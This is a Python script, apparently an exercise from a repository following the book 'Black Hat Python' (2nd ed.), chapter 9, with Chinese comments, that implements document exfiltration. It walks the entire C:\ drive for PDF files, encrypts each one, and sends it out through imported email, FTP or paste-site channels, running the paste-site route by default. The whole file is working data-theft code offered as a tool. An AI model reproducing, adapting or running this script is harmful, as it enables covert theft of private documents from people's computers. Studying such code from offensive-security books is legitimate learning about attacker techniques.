#!/usr/bin/env python
# encoding: utf-8
"""
@author: HuRuiFeng
@file: exfil.py
@time: 2022/5/26 22:43
@project: black-hat-python-2ed
@desc: P176 数据渗漏
"""
import os

from codes.ch09.cryptor import encrypt
from codes.ch09.email_exfil import outlook, plain_email
from codes.ch09.paste_exfil import ie_paste, plain_paste
from codes.ch09.transmit_exfil import plain_ftp, transmit

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}


def find_docs(doc_type='.pdf'):
    # 遍历整个文件系统查找PDF文件
    for parent, _, filenames in os.walk('c:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path


def exfiltrate(document_path, method):
    # 从源文件中读取数据，加密之后，写入一个临时文件夹中
    if method in ['transmit', 'plain_ftp']:
        filename = f"c:\\windows\\temp\\{os.path.basename(document_path)}"
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents))

        EXFIL[method](filename)
        os.unlink(filename)
    else:
        # 读取要渗漏的文件内容
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = os.path.basename(document_path)
        contents = encrypt(contents)
        # 发送渗漏邮件或是创建渗漏便签
        EXFIL[method](title, contents)


if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')
